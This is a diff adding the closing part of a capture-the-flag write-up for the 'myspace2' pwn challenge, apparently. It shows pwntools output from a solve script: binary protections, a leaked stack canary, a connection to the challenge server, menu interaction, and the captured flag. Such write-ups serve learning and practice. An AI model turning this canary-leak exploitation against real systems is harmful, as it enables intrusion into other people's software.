@@ -403,3 +403,34 @@ io.sendline(b"4")
 io.interactive()
 ```
 
+yay
+
+```
+[*] '/home/shuban/Code/py_workspace/ctf/idek/pwn/attachments/myspace2'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX unknown - GNU_STACK missing
+    PIE:      No PIE (0x400000)
+    Stack:    Executable
+    RWX:      Has RWX segments
+[+] Starting local process './myspace2': pid 13557
+[+] Opening connection to myspace2.chal.idek.team on port 1337: Done
+canary: 0xa9a39f5714d96d00
+/home/shuban/Code/py_workspace/ctf/idek/pwn/attachments/sol.py:27: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  io.sendline("2")
+/home/shuban/Code/py_workspace/ctf/idek/pwn/attachments/sol.py:29: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  io.sendline("7")
+[*] Switching to interactive mode
+
+Friend updated.
+
+1. See Top Friends
+2. Edit Friend
+3. Display Friend
+4. Quit
+>> 
+idek{b4bys_1st_c00k1e_leak_yayyy!}
+```
+
+fladge
